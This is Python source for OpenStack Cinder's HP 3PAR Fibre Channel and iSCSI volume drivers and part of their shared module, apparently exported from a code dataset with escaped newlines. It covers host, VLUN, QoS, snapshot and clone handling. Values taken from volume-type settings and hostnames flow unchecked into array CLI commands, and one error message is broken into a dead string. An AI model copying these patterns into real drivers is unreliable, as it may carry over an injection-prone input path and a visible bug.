int(port[0]), 'slot': int(port[1]),\n                               'cardPort': int(port[2])}\n\n                paths['portPos'] = portPos\n\n                # If FC entry\n                if tmp[5] == 'n/a':\n                    paths['wwn'] = tmp[3]\n                    host['FCPaths'].append(paths)\n                # else iSCSI entry\n                else:\n                    paths['name'] = tmp[3]\n                    paths['ipAddr'] = tmp[5]\n                    host['iSCSIPaths'].append(paths)\n\n            # find the offset to the description stuff\n            offset = 0\n            for line in out:\n                if line[:15] == '---------- Host':\n                    break\n                else:\n                    offset += 1\n\n            info = out[offset + 2]\n            tmp = info.split(':')\n            host['domain'] = tmp[1]\n\n            info = out[offset + 4]\n            tmp = info.split(':')\n            host['descriptors']['location'] = tmp[1]\n\n            info = out[offset + 5]\n            tmp = info.split(':')\n            host['descriptors']['ipAddr'] = tmp[1]\n\n            info = out[offset + 6]\n            tmp = info.split(':')\n            host['descriptors']['os'] = tmp[1]\n\n            info = out[offset + 7]\n            tmp = info.split(':')\n            host['descriptors']['model'] = tmp[1]\n\n            info = out[offset + 8]\n            tmp = info.split(':')\n            host['descriptors']['contact'] = tmp[1]\n\n            info = out[offset + 9]\n            tmp = info.split(':')\n            host['descriptors']['comment'] = tmp[1]\n\n        return host\n\n    def get_ports(self):\n        # First get the active FC ports\n        out = self._cli_run(['showport'])\n\n        # strip out header\n        # N:S:P,Mode,State,----Node_WWN----,-Port_WWN/HW_Addr-,Type,\n        # Protocol,Label,Partner,FailoverState\n        out = out[1:len(out) - 2]\n\n        ports = {'FC': [], 'iSCSI': {}}\n        for line in out:\n            tmp = line.split(',')\n\n            if tmp:\n                if tmp[1] == 'target' and tmp[2] == 'ready':\n                    if tmp[6] == 'FC':\n                        ports['FC'].append(tmp[4])\n\n        # now get the active iSCSI ports\n        out = self._cli_run(['showport', '-iscsi'])\n\n        # strip out header\n        # N:S:P,State,IPAddr,Netmask,Gateway,\n        # TPGT,MTU,Rate,DHCP,iSNS_Addr,iSNS_Port\n        out = out[1:len(out) - 2]\n        for line in out:\n            tmp = line.split(',')\n\n            if tmp and len(tmp) > 2:\n                if tmp[1] == 'ready':\n                    ports['iSCSI'][tmp[2]] = {}\n\n        # now get the nsp and iqn\n        result = self._cli_run(['showport', '-iscsiname'])\n        if result:\n            # first line is header\n            # nsp, ip,iqn\n            result = result[1:]\n            for line in result:\n                info = line.split(\",\")\n                if info and len(info) > 2:\n                    if info[1] in ports['iSCSI']:\n                        nsp = info[0]\n                        ip_addr = info[1]\n                        iqn = info[2]\n                        ports['iSCSI'][ip_addr] = {'nsp': nsp,\n                                                   'iqn': iqn\n                                                   }\n\n        LOG.debug(\"PORTS = %s\" % pprint.pformat(ports))\n        return ports\n\n    def get_volume_stats(self, refresh):\n        if refresh:\n            self._update_volume_stats()\n\n        return self.stats\n\n    def _update_volume_stats(self):\n        # const to convert MiB to GB\n        const = 0.0009765625\n\n        # storage_protocol and volume_backend_name are\n        # set in the child classes\n        stats = {'driver_version': '1.0',\n                 'free_capacity_gb': 'unknown',\n                 'reserved_percentage': 0,\n                 'storage_protocol': None,\n                 'total_capacity_gb': 'unknown',\n                 'QoS_support': True,\n                 'vendor_name': 'Hewlett-Packard',\n                 'volume_backend_name': None}\n\n        try:\n            cpg = self.client.getCPG(self.config.hp3par_cpg)\n            if 'limitMiB' not in cpg['SDGrowth']:\n                total_capacity = 'infinite'\n                free_capacity = 'infinite'\n            else:\n                total_capacity = int(cpg['SDGrowth']['limitMiB'] * const)\n                free_capacity = int((cpg['SDGrowth']['limitMiB'] -\n                                    cpg['UsrUsage']['usedMiB']) * const)\n\n            stats['total_capacity_gb'] = total_capacity\n            stats['free_capacity_gb'] = free_capacity\n        except hpexceptions.HTTPNotFound:\n            err = (_(\"CPG (%s) doesn't exist on array\")\n                   % self.config.hp3par_cpg)\n            LOG.error(err)\n            raise exception.InvalidInput(reason=err)\n\n        self.stats = stats\n\n    def create_vlun(self, volume, host):\n        \"\"\"Create a VLUN.\n\n        In order to export a volume on a 3PAR box, we have to create a VLUN.\n        \"\"\"\n        volume_name = self._get_3par_vol_name(volume['id'])\n        self._create_3par_vlun(volume_name, host['name'])\n        return self.client.getVLUN(volume_name)\n\n    def delete_vlun(self, volume, hostname):\n        volume_name = self._get_3par_vol_name(volume['id'])\n        vlun = self.client.getVLUN(volume_name)\n        self.client.deleteVLUN(volume_name, vlun['lun'], hostname)\n        self._delete_3par_host(hostname)\n\n    def _get_volume_type(self, type_id):\n        ctxt = context.get_admin_context()\n        return volume_types.get_volume_type(ctxt, type_id)\n\n    def _get_key_value(self, hp3par_keys, key, default=None):\n        if hp3par_keys is not None and key in hp3par_keys:\n            return hp3par_keys[key]\n        else:\n            return default\n\n    def _get_qos_value(self, qos, key, default=None):\n        if key in qos:\n            return qos[key]\n        else:\n            return default\n\n    def _get_qos_by_volume_type(self, volume_type):\n        qos = {}\n        specs = volume_type.get('extra_specs')\n        for key, value in specs.iteritems():\n            if 'qos:' in key:\n                fields = key.split(':')\n                key = fields[1]\n            if key in self.hp_qos_keys:\n                qos[key] = int(value)\n        return qos\n\n    def _get_keys_by_volume_type(self, volume_type):\n        hp3par_keys = {}\n        specs = volume_type.get('extra_specs')\n        for key, value in specs.iteritems():\n            if ':' in key:\n                fields = key.split(':')\n                key = fields[1]\n            if key in self.hp3par_valid_keys:\n                hp3par_keys[key] = value\n        return hp3par_keys\n\n    def _set_qos_rule(self, qos, vvs_name):\n        max_io = self._get_qos_value(qos, 'maxIOPS')\n        max_bw = self._get_qos_value(qos, 'maxBWS')\n        cli_qos_string = \"\"\n        if max_io is not None:\n            cli_qos_string += ('-io %s ' % max_io)\n        if max_bw is not None:\n            cli_qos_string += ('-bw %sM ' % max_bw)\n        self._cli_run(['setqos', '%svvset:%s' % (cli_qos_string, vvs_name)])\n\n    def _add_volume_to_volume_set(self, volume, volume_name,\n                                  cpg, vvs_name, qos):\n        if vvs_name is not None:\n            # Admin has set a volume set name to add the volume to\n            self._cli_run(['createvvset', '-add', vvs_name, volume_name])\n        else:\n            vvs_name = self._get_3par_vvs_name(volume['id'])\n            domain = self.get_domain(cpg)\n            self._cli_run(['createvvset', '-domain', domain, vvs_name])\n            self._set_qos_rule(qos, vvs_name)\n            self._cli_run(['createvvset', '-add', vvs_name, volume_name])\n\n    def _remove_volume_set(self, vvs_name):\n        # Must first clear the QoS rules before removing the volume set\n        self._cli_run(['setqos', '-clear', 'vvset:%s' % (vvs_name)])\n        self._cli_run(['removevvset', '-f', vvs_name])\n\n    def _remove_volume_from_volume_set(self, volume_name, vvs_name):\n        self._cli_run(['removevvset', '-f', vvs_name, volume_name])\n\n    def get_cpg(self, volume, allowSnap=False):\n        volume_name = self._get_3par_vol_name(volume['id'])\n        vol = self.client.getVolume(volume_name)\n        if 'userCPG' in vol:\n            return vol['userCPG']\n        elif allowSnap:\n            return vol['snapCPG']\n        return None\n\n    def _get_3par_vol_comment(self, volume_name):\n        vol = self.client.getVolume(volume_name)\n        if 'comment' in vol:\n            return vol['comment']\n        return None\n\n    def get_persona_type(self, volume, hp3par_keys=None):\n        default_persona = self.valid_persona_values[0]\n        type_id = volume.get('volume_type_id', None)\n        volume_type = None\n        if type_id is not None:\n            volume_type = self._get_volume_type(type_id)\n            if hp3par_keys is None:\n                hp3par_keys = self._get_keys_by_volume_type(volume_type)\n        persona_value = self._get_key_value(hp3par_keys, 'persona',\n                                            default_persona)\n        if persona_value not in self.valid_persona_values:\n            err = _(\"Must specify a valid persona %(valid)s, \"\n                    \"value '%(persona)s' is invalid.\") % \\\n                   ({'valid': self.valid_persona_values,\n                     'persona': persona_value})\n            raise exception.InvalidInput(reason=err)\n        # persona is set by the id so remove the text and return the id\n        # i.e for persona '1 - Generic' returns 1\n        persona_id = persona_value.split(' ')\n        return persona_id[0]\n\n    def get_volume_settings_from_type(self, volume):\n        cpg = None\n        snap_cpg = None\n        volume_type = None\n        vvs_name = None\n        hp3par_keys = {}\n        qos = {}\n        type_id = volume.get('volume_type_id', None)\n        if type_id is not None:\n            volume_type = self._get_volume_type(type_id)\n            hp3par_keys = self._get_keys_by_volume_type(volume_type)\n            vvs_name = self._get_key_value(hp3par_keys, 'vvs')\n            if vvs_name is None:\n                qos = self._get_qos_by_volume_type(volume_type)\n\n        cpg = self._get_key_value(hp3par_keys, 'cpg',\n                                  self.config.hp3par_cpg)\n        if cpg is not self.config.hp3par_cpg:\n            # The cpg was specified in a volume type extra spec so it\n            # needs to be validiated that it's in the correct domain.\n            self.validate_cpg(cpg)\n            # Also, look to see if the snap_cpg was specified in volume\n            # type extra spec, if not use the extra spec cpg as the\n            # default.\n            snap_cpg = self._get_key_value(hp3par_keys, 'snap_cpg', cpg)\n        else:\n            # default snap_cpg to hp3par_cpg_snap if it's not specified\n            # in the volume type extra specs.\n            snap_cpg = self.config.hp3par_cpg_snap\n            # if it's still not set or empty then set it to the cpg\n            # specified in the cinder.conf file.\n            if not self.config.hp3par_cpg_snap:\n                snap_cpg = cpg\n\n        # if provisioning is not set use thin\n        default_prov = self.valid_prov_values[0]\n        prov_value = self._get_key_value(hp3par_keys, 'provisioning',\n                                         default_prov)\n        # check for valid provisioning type\n        if prov_value not in self.valid_prov_values:\n            err = _(\"Must specify a valid provisioning type %(valid)s, \"\n                    \"value '%(prov)s' is invalid.\") % \\\n                   ({'valid': self.valid_prov_values,\n                     'prov': prov_value})\n            raise exception.InvalidInput(reason=err)\n\n        tpvv = True\n        if prov_value == \"full\":\n            tpvv = False\n\n        # check for valid persona even if we don't use it until\n        # attach time, this will give the end user notice that the\n        # persona type is invalid at volume creation time\n        self.get_persona_type(volume, hp3par_keys)\n\n        return {'cpg': cpg, 'snap_cpg': snap_cpg,\n                'vvs_name': vvs_name, 'qos': qos,\n                'tpvv': tpvv, 'volume_type': volume_type}\n\n    def create_volume(self, volume):\n        LOG.debug(\"CREATE VOLUME (%s : %s %s)\" %\n                  (volume['display_name'], volume['name'],\n                   self._get_3par_vol_name(volume['id'])))\n        try:\n            comments = {'volume_id': volume['id'],\n                        'name': volume['name'],\n                        'type': 'OpenStack'}\n\n            name = volume.get('display_name', None)\n            if name:\n                comments['display_name'] = name\n\n            # get the options supported by volume types\n            type_info = self.get_volume_settings_from_type(volume)\n            volume_type = type_info['volume_type']\n            vvs_name = type_info['vvs_name']\n            qos = type_info['qos']\n            cpg = type_info['cpg']\n            snap_cpg = type_info['snap_cpg']\n            tpvv = type_info['tpvv']\n\n            type_id = volume.get('volume_type_id', None)\n            if type_id is not None:\n                comments['volume_type_name'] = volume_type.get('name')\n                comments['volume_type_id'] = type_id\n                if vvs_name is not None:\n                    comments['vvs'] = vvs_name\n                else:\n                    comments['qos'] = qos\n\n            extras = {'comment': json.dumps(comments),\n                      'snapCPG': snap_cpg,\n                      'tpvv': tpvv}\n\n            capacity = self._capacity_from_size(volume['size'])\n            volume_name = self._get_3par_vol_name(volume['id'])\n            self.client.createVolume(volume_name, cpg, capacity, extras)\n            if qos or vvs_name is not None:\n                try:\n                    self._add_volume_to_volume_set(volume, volume_name,\n                                                   cpg, vvs_name, qos)\n                except Exception as ex:\n                    # Delete the volume if unable to add it to the volume set\n                    self.client.deleteVolume(volume_name)\n                    LOG.error(str(ex))\n                    raise exception.CinderException(ex.get_description())\n        except hpexceptions.HTTPConflict:\n            raise exception.Duplicate(_(\"Volume (%s) already exists on array\")\n                                      % volume_name)\n        except hpexceptions.HTTPBadRequest as ex:\n            LOG.error(str(ex))\n            raise exception.Invalid(ex.get_description())\n        except exception.InvalidInput as ex:\n            LOG.error(str(ex))\n            raise ex\n        except Exception as ex:\n            LOG.error(str(ex))\n            raise exception.CinderException(ex.get_description())\n\n    def _copy_volume(self, src_name, dest_name, cpg=None, snap_cpg=None,\n                     tpvv=True):\n        # Virtual volume sets are not supported with the -online option\n        cmd = ['createvvcopy', '-p', src_name, '-online']\n        if snap_cpg:\n            cmd.extend(['-snp_cpg', snap_cpg])\n        if tpvv:\n            cmd.append('-tpvv')\n        if cpg:\n            cmd.append(cpg)\n        cmd.append(dest_name)\n        LOG.debug('Creating clone of a volume with %s' % cmd)\n        self._cli_run(cmd)\n\n    def get_next_word(self, s, search_string):\n        \"\"\"Return the next word.\n\n        Search 's' for 'search_string', if found return the word preceding\n        'search_string' from 's'.\n        \"\"\"\n        word = re.search(search_string.strip(' ') + ' ([^ ]*)', s)\n        return word.groups()[0].strip(' ')\n\n    def _get_3par_vol_comment_value(self, vol_comment, key):\n        comment_dict = dict(ast.literal_eval(vol_comment))\n        if key in comment_dict:\n            return comment_dict[key]\n        return None\n\n    def create_cloned_volume(self, volume, src_vref):\n        try:\n            orig_name = self._get_3par_vol_name(volume['source_volid'])\n            vol_name = self._get_3par_vol_name(volume['id'])\n\n            type_info = self.get_volume_settings_from_type(volume)\n\n            # make the 3PAR copy the contents.\n            # can't delete the original until the copy is done.\n            self._copy_volume(orig_name, vol_name, cpg=type_info['cpg'],\n                              snap_cpg=type_info['snap_cpg'],\n                              tpvv=type_info['tpvv'])\n            return None\n        except hpexceptions.HTTPForbidden:\n            raise exception.NotAuthorized()\n        except hpexceptions.HTTPNotFound:\n            raise exception.NotFound()\n        except Exception as ex:\n            LOG.error(str(ex))\n            raise exception.CinderException(ex)\n\n    def _get_vvset_from_3par(self, volume_name):\n        \"\"\"Get Virtual Volume Set from 3PAR.\n\n        The only way to do this currently is to try and delete the volume\n        to get the error message.\n\n        NOTE(walter-boring): don't call this unless you know the volume is\n        already in a vvset!\n        \"\"\"\n        cmd = ['removevv', '-f', volume_name]\n        LOG.debug(\"Issuing remove command to find vvset name %s\" % cmd)\n        out = self._cli_run(cmd)\n        vvset_name = None\n        if out and len(out) > 1:\n            if out[1].startswith(\"Attempt to delete \"):\n                words = out[1].split(\" \")\n                vvset_name = words[len(words) - 1]\n\n        return vvset_name\n\n    def delete_volume(self, volume):\n        try:\n            volume_name = self._get_3par_vol_name(volume['id'])\n            # Try and delete the volume, it might fail here because\n            # the volume is part of a volume set which will have the\n            # volume set name in the error.\n            try:\n                self.client.deleteVolume(volume_name)\n            except hpexceptions.HTTPConflict as ex:\n                if ex.get_code() == 34:\n                    # This is a special case which means the\n                    # volume is part of a volume set.\n                    vvset_name = self._get_vvset_from_3par(volume_name)\n                    LOG.debug(\"Returned vvset_name = %s\" % vvset_name)\n                    if vvset_name is not None and \\\n                       vvset_name.startswith('vvs-'):\n                        # We have a single volume per volume set, so\n                        # remove the volume set.\n                        self._remove_volume_set(\n                            self._get_3par_vvs_name(volume['id']))\n                    elif vvset_name is not None:\n                        # We have a pre-defined volume set just remove the\n                        # volume and leave the volume set.\n                        self._remove_volume_from_volume_set(volume_name,\n                                                            vvset_name)\n                    self.client.deleteVolume(volume_name)\n                else:\n                    raise ex\n\n        except hpexceptions.HTTPNotFound as ex:\n            # We'll let this act as if it worked\n            # it helps clean up the cinder entries.\n            LOG.error(str(ex))\n        except hpexceptions.HTTPForbidden as ex:\n            LOG.error(str(ex))\n            raise exception.NotAuthorized(ex.get_description())\n        except Exception as ex:\n            LOG.error(str(ex))\n            raise exception.CinderException(ex)\n\n    def create_volume_from_snapshot(self, volume, snapshot):\n        \"\"\"Creates a volume from a snapshot.\n\n        TODO: support using the size from the user.\n        \"\"\"\n        LOG.debug(\"Create Volume from Snapshot\\n%s\\n%s\" %\n                  (pprint.pformat(volume['display_name']),\n                   pprint.pformat(snapshot['display_name'])))\n\n        if snapshot['volume_size'] != volume['size']:\n            err = \"You cannot change size of the volume.  It must \"\n            \"be the same as the snapshot.\"\n            LOG.error(err)\n            raise exception.InvalidInput(reason=err)\n\n        try:\n            snap_name = self._get_3par_snap_name(snapshot['id'])\n            volume_name = self._get_3par_vol_name(volume['id'])\n\n            extra = {'volume_id': volume['id'],\n                     'snapshot_id': snapshot['id']}\n\n            volume_type = None\n            type_id = volume.get('volume_type_id', None)\n            vvs_name = None\n            qos = {}\n            hp3par_keys = {}\n            if type_id is not None:\n                volume_type = self._get_volume_type(type_id)\n                hp3par_keys = self._get_keys_by_volume_type(volume_type)\n                vvs_name = self._get_key_value(hp3par_keys, 'vvs')\n                if vvs_name is None:\n                    qos = self._get_qos_by_volume_type(volume_type)\n\n            name = volume.get('display_name', None)\n            if name:\n                extra['display_name'] = name\n\n            description = volume.get('display_description', None)\n            if description:\n                extra['description'] = description\n\n            optional = {'comment': json.dumps(extra),\n                        'readOnly': False}\n\n            self.client.createSnapshot(volume_name, snap_name, optional)\n            if qos or vvs_name is not None:\n                cpg = self._get_key_value(hp3par_keys, 'cpg',\n                                          self.config.hp3par_cpg)\n                try:\n                    self._add_volume_to_volume_set(volume, volume_name,\n                                                   cpg, vvs_name, qos)\n                except Exception as ex:\n                    # Delete the volume if unable to add it to the volume set\n                    self.client.deleteVolume(volume_name)\n                    LOG.error(str(ex))\n                    raise exception.CinderException(ex.get_description())\n        except hpexceptions.HTTPForbidden:\n            raise exception.NotAuthorized()\n        except hpexceptions.HTTPNotFound:\n            raise exception.NotFound()\n        except Exception as ex:\n            LOG.error(str(ex))\n            raise exception.CinderException(ex.get_description())\n\n    def create_snapshot(self, snapshot):\n        LOG.debug(\"Create Snapshot\\n%s\" % pprint.pformat(snapshot))\n\n        try:\n            snap_name = self._get_3par_snap_name(snapshot['id'])\n            vol_name = self._get_3par_vol_name(snapshot['volume_id'])\n\n            extra = {'volume_name': snapshot['volume_name']}\n            vol_id = snapshot.get('volume_id', None)\n            if vol_id:\n                extra['volume_id'] = vol_id\n\n            try:\n                extra['display_name'] = snapshot['display_name']\n            except AttributeError:\n                pass\n\n            try:\n                extra['description'] = snapshot['display_description']\n            except AttributeError:\n                pass\n\n            optional = {'comment': json.dumps(extra),\n                        'readOnly': True}\n            if self.config.hp3par_snapshot_expiration:\n                optional['expirationHours'] = (\n                    self.config.hp3par_snapshot_expiration)\n\n            if self.config.hp3par_snapshot_retention:\n                optional['retentionHours'] = (\n                    self.config.hp3par_snapshot_retention)\n\n            self.client.createSnapshot(snap_name, vol_name, optional)\n        except hpexceptions.HTTPForbidden:\n            raise exception.NotAuthorized()\n        except hpexceptions.HTTPNotFound:\n            raise exception.NotFound()\n\n    def delete_snapshot(self, snapshot):\n        LOG.debug(\"Delete Snapshot\\n%s\" % pprint.pformat(snapshot))\n\n        try:\n            snap_name = self._get_3par_snap_name(snapshot['id'])\n            self.client.deleteVolume(snap_name)\n        except hpexceptions.HTTPForbidden:\n            raise exception.NotAuthorized()\n        except hpexceptions.HTTPNotFound as ex:\n            LOG.error(str(ex))\n\n    def _get_3par_hostname_from_wwn_iqn(self, wwns_iqn):\n        out = self._cli_run(['showhost', '-d'])\n        # wwns_iqn may be a list of strings or a single\n        # string. So, if necessary, create a list to loop.\n        if not isinstance(wwns_iqn, list):\n            wwn_iqn_list = [wwns_iqn]\n        else:\n            wwn_iqn_list = wwns_iqn\n\n        for wwn_iqn in wwn_iqn_list:\n            for showhost in out:\n                if (wwn_iqn.upper() in showhost.upper()):\n                    return showhost.split(',')[1]\n\n    def terminate_connection(self, volume, hostname, wwn_iqn):\n        \"\"\"Driver entry point to unattach a volume from an instance.\"\"\"\n        try:\n            # does 3par know this host by a different name?\n            if hostname in self.hosts_naming_dict:\n                hostname = self.hosts_naming_dict.get(hostname)\n            self.delete_vlun(volume, hostname)\n            return\n        except hpexceptions.HTTPNotFound as e:\n            if 'host does not exist' in e.get_description():\n                # use the wwn to see if we can find the hostname\n                hostname = self._get_3par_hostname_from_wwn_iqn(wwn_iqn)\n                # no 3par host, re-throw\n                if (hostname is None):\n                    raise\n            else:\n            # not a 'host does not exist' HTTPNotFound exception, re-throw\n                raise\n\n        #try again with name retrieved from 3par\n        self.delete_vlun(volume, hostname)\n\n    def parse_create_host_error(self, hostname, out):\n        search_str = \"already used by host \"\n        if search_str in out[1]:\n            #host exists, return name used by 3par\n            hostname_3par = self.get_next_word(out[1], search_str)\n            self.hosts_naming_dict[hostname] = hostname_3par\n            return hostname_3par\n/n/n/ncinder/volume/drivers/san/hp/hp_3par_fc.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4\n#\n#    (c) Copyright 2013 Hewlett-Packard Development Company, L.P.\n#    All Rights Reserved.\n#\n#    Copyright 2012 OpenStack LLC\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n#\n\"\"\"\nVolume driver for HP 3PAR Storage array.\nThis driver requires 3.1.2 MU2 firmware on the 3PAR array.\n\nYou will need to install the python hp3parclient.\nsudo pip install hp3parclient\n\nSet the following in the cinder.conf file to enable the\n3PAR Fibre Channel Driver along with the required flags:\n\nvolume_driver=cinder.volume.drivers.san.hp.hp_3par_fc.HP3PARFCDriver\n\"\"\"\n\nfrom hp3parclient import exceptions as hpexceptions\nfrom oslo.config import cfg\n\nfrom cinder import exception\nfrom cinder.openstack.common import log as logging\nfrom cinder import utils\nimport cinder.volume.driver\nfrom cinder.volume.drivers.san.hp import hp_3par_common as hpcommon\nfrom cinder.volume.drivers.san import san\n\nVERSION = 1.1\nLOG = logging.getLogger(__name__)\n\n\nclass HP3PARFCDriver(cinder.volume.driver.FibreChannelDriver):\n    \"\"\"OpenStack Fibre Channel driver to enable 3PAR storage array.\n\n    Version history:\n        1.0 - Initial driver\n        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,\n              session changes, faster clone, requires 3.1.2 MU2 firmware,\n              copy volume <--> Image.\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        super(HP3PARFCDriver, self).__init__(*args, **kwargs)\n        self.common = None\n        self.configuration.append_config_values(hpcommon.hp3par_opts)\n        self.configuration.append_config_values(san.san_opts)\n\n    def _init_common(self):\n        return hpcommon.HP3PARCommon(self.configuration)\n\n    def _check_flags(self):\n        \"\"\"Sanity check to ensure we have required options set.\"\"\"\n        required_flags = ['hp3par_api_url', 'hp3par_username',\n                          'hp3par_password',\n                          'san_ip', 'san_login', 'san_password']\n        self.common.check_flags(self.configuration, required_flags)\n\n    @utils.synchronized('3par', external=True)\n    def get_volume_stats(self, refresh):\n        self.common.client_login()\n        stats = self.common.get_volume_stats(refresh)\n        stats['storage_protocol'] = 'FC'\n        backend_name = self.configuration.safe_get('volume_backend_name')\n        stats['volume_backend_name'] = backend_name or self.__class__.__name__\n        self.common.client_logout()\n        return stats\n\n    def do_setup(self, context):\n        self.common = self._init_common()\n        self._check_flags()\n        self.common.do_setup(context)\n\n    def check_for_setup_error(self):\n        \"\"\"Returns an error if prerequisites aren't met.\"\"\"\n        self._check_flags()\n\n    @utils.synchronized('3par', external=True)\n    def create_volume(self, volume):\n        self.common.client_login()\n        metadata = self.common.create_volume(volume)\n        self.common.client_logout()\n        return {'metadata': metadata}\n\n    @utils.synchronized('3par', external=True)\n    def create_cloned_volume(self, volume, src_vref):\n        self.common.client_login()\n        new_vol = self.common.create_cloned_volume(volume, src_vref)\n        self.common.client_logout()\n        return {'metadata': new_vol}\n\n    @utils.synchronized('3par', external=True)\n    def delete_volume(self, volume):\n        self.common.client_login()\n        self.common.delete_volume(volume)\n        self.common.client_logout()\n\n    @utils.synchronized('3par', external=True)\n    def create_volume_from_snapshot(self, volume, snapshot):\n        \"\"\"\n        Creates a volume from a snapshot.\n\n        TODO: support using the size from the user.\n        \"\"\"\n        self.common.client_login()\n        metadata = self.common.create_volume_from_snapshot(volume, snapshot)\n        self.common.client_logout()\n        return {'metadata': metadata}\n\n    @utils.synchronized('3par', external=True)\n    def create_snapshot(self, snapshot):\n        self.common.client_login()\n        self.common.create_snapshot(snapshot)\n        self.common.client_logout()\n\n    @utils.synchronized('3par', external=True)\n    def delete_snapshot(self, snapshot):\n        self.common.client_login()\n        self.common.delete_snapshot(snapshot)\n        self.common.client_logout()\n\n    @utils.synchronized('3par', external=True)\n    def initialize_connection(self, volume, connector):\n        \"\"\"Assigns the volume to a server.\n\n        Assign any created volume to a compute node/host so that it can be\n        used from that host.\n\n        The  driver returns a driver_volume_type of 'fibre_channel'.\n        The target_wwn can be a single entry or a list of wwns that\n        correspond to the list of remote wwn(s) that will export the volume.\n        Example return values:\n\n            {\n                'driver_volume_type': 'fibre_channel'\n                'data': {\n                    'target_discovered': True,\n                    'target_lun': 1,\n                    'target_wwn': '1234567890123',\n                }\n            }\n\n            or\n\n             {\n                'driver_volume_type': 'fibre_channel'\n                'data': {\n                    'target_discovered': True,\n                    'target_lun': 1,\n                    'target_wwn': ['1234567890123', '0987654321321'],\n                }\n            }\n\n\n        Steps to export a volume on 3PAR\n          * Create a host on the 3par with the target wwn\n          * Create a VLUN for that HOST with the volume we want to export.\n\n        \"\"\"\n        self.common.client_login()\n        # we have to make sure we have a host\n        host = self._create_host(volume, connector)\n\n        # now that we have a host, create the VLUN\n        vlun = self.common.create_vlun(volume, host)\n\n        ports = self.common.get_ports()\n\n        self.common.client_logout()\n        info = {'driver_volume_type': 'fibre_channel',\n                'data': {'target_lun': vlun['lun'],\n                         'target_discovered': True,\n                         'target_wwn': ports['FC']}}\n        return info\n\n    @utils.synchronized('3par', external=True)\n    def terminate_connection(self, volume, connector, **kwargs):\n        \"\"\"Driver entry point to unattach a volume from an instance.\"\"\"\n        self.common.client_login()\n        self.common.terminate_connection(volume,\n                                         connector['host'],\n                                         connector['wwpns'])\n        self.common.client_logout()\n\n    def _create_3par_fibrechan_host(self, hostname, wwns, domain, persona_id):\n        \"\"\"Create a 3PAR host.\n\n        Create a 3PAR host, if there is already a host on the 3par using\n        the same wwn but with a different hostname, return the hostname\n        used by 3PAR.\n        \"\"\"\n        command = ['createhost', '-persona', persona_id, '-domain', domain,\n                   hostname]\n        for wwn in wwns:\n            command.append(wwn)\n\n        out = self.common._cli_run(command)\n        if out and len(out) > 1:\n            return self.common.parse_create_host_error(hostname, out)\n\n        return hostname\n\n    def _modify_3par_fibrechan_host(self, hostname, wwns):\n        # when using -add, you can not send the persona or domain options\n        command = ['createhost', '-add', hostname]\n        for wwn in wwns:\n            command.append(wwn)\n\n        out = self.common._cli_run(command)\n\n    def _create_host(self, volume, connector):\n        \"\"\"Creates or modifies existing 3PAR host.\"\"\"\n        host = None\n        hostname = self.common._safe_hostname(connector['host'])\n        cpg = self.common.get_cpg(volume, allowSnap=True)\n        domain = self.common.get_domain(cpg)\n        try:\n            host = self.common._get_3par_host(hostname)\n            if not host['FCPaths']:\n                self._modify_3par_fibrechan_host(hostname, connector['wwpns'])\n                host = self.common._get_3par_host(hostname)\n        except hpexceptions.HTTPNotFound as ex:\n            # get persona from the volume type extra specs\n            persona_id = self.common.get_persona_type(volume)\n            # host doesn't exist, we have to create it\n            hostname = self._create_3par_fibrechan_host(hostname,\n                                                        connector['wwpns'],\n                                                        domain,\n                                                        persona_id)\n            host = self.common._get_3par_host(hostname)\n\n        return host\n\n    @utils.synchronized('3par', external=True)\n    def create_export(self, context, volume):\n        pass\n\n    @utils.synchronized('3par', external=True)\n    def ensure_export(self, context, volume):\n        pass\n\n    @utils.synchronized('3par', external=True)\n    def remove_export(self, context, volume):\n        pass\n\n    def extend_volume(self, volume, new_size):\n        self.common.extend_volume(volume, new_size)\n/n/n/ncinder/volume/drivers/san/hp/hp_3par_iscsi.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4\n#\n#    (c) Copyright 2012-2013 Hewlett-Packard Development Company, L.P.\n#    All Rights Reserved.\n#\n#    Copyright 2012 OpenStack LLC\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n#\n\"\"\"\nVolume driver for HP 3PAR Storage array.\nThis driver requires 3.1.2 MU2 firmware on the 3PAR array.\n\nYou will need to install the python hp3parclient.\nsudo pip install hp3parclient\n\nSet the following in the cinder.conf file to enable the\n3PAR iSCSI Driver along with the required flags:\n\nvolume_driver=cinder.volume.drivers.san.hp.hp_3par_iscsi.HP3PARISCSIDriver\n\"\"\"\n\nimport sys\n\nfrom hp3parclient import exceptions as hpexceptions\n\nfrom cinder import exception\nfrom cinder.openstack.common import log as logging\nfrom cinder import utils\nimport cinder.volume.driver\nfrom cinder.volume.drivers.san.hp import hp_3par_common as hpcommon\nfrom cinder.volume.drivers.san import san\n\nVERSION = 1.1\nLOG = logging.getLogger(__name__)\nDEFAULT_ISCSI_PORT = 3260\n\n\nclass HP3PARISCSIDriver(cinder.volume.driver.ISCSIDriver):\n    \"\"\"OpenStack iSCSI driver to enable 3PAR storage array.\n\n    Version history:\n        1.0 - Initial driver\n        1.1 - QoS, extend volume, multiple iscsi ports, remove domain,\n              session changes, faster clone, requires 3.1.2 MU2 firmware.\n\n    \"\"\"\n    def __init__(self, *args, **kwargs):\n        super(HP3PARISCSIDriver, self).__init__(*args, **kwargs)\n        self.common = None\n        self.configuration.append_config_values(hpcommon.hp3par_opts)\n        self.configuration.append_config_values(san.san_opts)\n\n    def _init_common(self):\n        return hpcommon.HP3PARCommon(self.configuration)\n\n    def _check_flags(self):\n        \"\"\"Sanity check to ensure we have required options set.\"\"\"\n        required_flags = ['hp3par_api_url', 'hp3par_username',\n                          'hp3par_password', 'san_ip', 'san_login',\n                          'san_password']\n        